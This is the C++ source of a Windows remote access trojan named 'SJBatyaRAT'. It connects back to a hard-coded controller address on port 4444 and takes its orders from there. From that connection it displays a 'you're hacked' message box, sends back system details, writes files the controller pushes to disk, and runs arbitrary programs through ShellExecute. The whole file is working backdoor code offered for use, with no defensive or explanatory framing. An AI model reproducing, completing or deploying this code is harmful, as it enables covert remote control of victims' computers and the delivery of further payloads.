#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#pragma comment(lib, "Ws2_32.lib")

void ReceiveFile(SOCKET server)
{
    char fileSizeBuffer[1024];
    int bytesReceived = recv(server, fileSizeBuffer, sizeof(fileSizeBuffer), 0);
    if (bytesReceived > 0)
    {
        fileSizeBuffer[bytesReceived] = '\0';
        std::string fileSizeStr(fileSizeBuffer);

        size_t fileSize = 0;
        try {
            fileSize = std::stoull(fileSizeStr);
        }
        catch (const std::invalid_argument& ex) {
            printf("Invalid file size: %s\n", fileSizeStr.c_str());
            return;
        }
        catch (const std::out_of_range& ex) {
            printf("File size out of range: %s\n", fileSizeStr.c_str());
            return;
        }

        std::string fileName;
        char buffer[1024];
        bytesReceived = recv(server, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';
            fileName = buffer;
        }
        else
        {
            printf("Error receiving file name\n");
            return;
        }

        std::ofstream file(fileName, std::ios::binary);
        if (!file.is_open())
        {
            printf("Failed to create file\n");
            return;
        }

        size_t bytesReceivedTotal = 0;
        while (bytesReceivedTotal < fileSize)
        {
            int remainingBytes = fileSize - bytesReceivedTotal;
            int bytesToReceive = remainingBytes < 1024 ? remainingBytes : 1024;
            bytesReceived = recv(server, buffer, bytesToReceive, 0);
            if (bytesReceived > 0)
            {
                file.write(buffer, bytesReceived);
                bytesReceivedTotal += bytesReceived;
            }
            else
            {
                printf("Error receiving file\n");
                file.close();
                return;
            }
        }

        file.close();
        printf("File received: %s\n", fileName.c_str());
    }
    else
    {
        printf("Error receiving file size\n");
        return;
    }
}

void ExecuteCommand(const std::string& command)
{
    HINSTANCE hInstance = ShellExecute(NULL, "open", command.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
    if ((int)hInstance <= 32)
    {
        printf("Failed to execute command\n");
        return;
    }
}

int main(int argc, char* argv[])
{
    char* ip_addr = "192.168.31.135";
    int port = 4444;

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(4444); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
    if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        printf("Failed to connect\n%d\n", WSAGetLastError());
        system("pause");
        exit(1);
    }

    char buff[1024];
    while (true)
    {
        int bytesReceived = recv(Connection, buff, sizeof(buff), 0);
        if (bytesReceived > 0) 
        {
            buff[bytesReceived] = '\0';
            std::string command(buff);
            if (command == "msgbox") {
                std::string callback = "Message box was summoned!";
                send(Connection, callback.c_str(), callback.size(), 0);

                MessageBox(NULL, "U're hacked by SJBatyaRAT!", "SJBatyaRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                OSVERSIONINFOEX osvi;
                ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
                osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
                GetVersionEx((LPOSVERSIONINFO)&osvi);

                std::string systemInfo = "System: " + std::to_string(osvi.dwMajorVersion) + "." +
                                        std::to_string(osvi.dwMinorVersion) + "." +
                                        std::to_string(osvi.dwBuildNumber) + " " +
                                        osvi.szCSDVersion;

                std::string architecture = "Architecture: " + std::string(sizeof(void*) == 8 ? "64-bit" : "32-bit");

                char computerName[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD computerNameSize = sizeof(computerName);
                GetComputerNameA(computerName, &computerNameSize);
                std::string computerNameStr(computerName, computerNameSize);

                std::string processor = "Processor: " + std::string("TODO: Retrieve processor information");
                std::string username = "User: " + std::string("TODO: Retrieve username");

                std::string output = systemInfo + "\n" + architecture + "\n" + "Name of Computer: " + computerNameStr + "\n" +
                                    processor + "\n" + username;
                
                send(Connection, output.c_str(), output.size(), 0);
            }
            else if (command.substr(0, 6) == "upload")
            {
                std::string filePath = command.substr(7);
                ReceiveFile(Connection);
            }
            else if (command.substr(0, 7) == "execute")
            { 
                std::string cmd = command.substr(8);
                std::string output = cmd + " was executed!";
                send(Connection, output.c_str(), output.size(), 0);
                ExecuteCommand(cmd);
            }

            else if (command == "exit" || command == "quit" || command == "bye") {
                std::string callback = "Client terminated...";
                send(Connection, callback.c_str(), callback.size(), 0);
                exit(0);
            }
        }
    }

    Sleep(2000);  // Задержка на 2 секунды перед закрытием консоли

    closesocket(Connection);
    WSACleanup();
    return 0;
}